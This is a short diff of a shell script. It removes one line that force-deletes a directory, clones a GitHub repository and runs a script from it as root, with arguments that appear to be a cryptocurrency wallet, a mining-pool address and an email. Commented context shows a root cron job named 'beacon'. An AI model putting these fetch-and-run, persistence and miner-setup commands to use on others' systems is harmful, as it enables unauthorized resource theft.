@@ -31,6 +31,3 @@ if [ $# -eq 3 ]; then
     #executable='bash /patata/tramboliko2.sh'
     #echo "${cronjob} root $executable >/dev/null 2>&1" | sudo tee /etc/cron.d/beacon
 fi
-
-
-sudo rm -rf /patata && sudo git clone https://github.com/frotunato/patata.git /patata && sudo bash /patata/salchipapa2.sh 4A6xNd9dSaqL29V2mzpzDFfcUg4JG4wy2PZq5iAmy9ezXvvsVaYzdCPhikXYYTQ54DWpT7VVSfen6LqfgoNPmuP5Cz8o5ZR 51.254.143.175:8090 frotunato@gmail.com
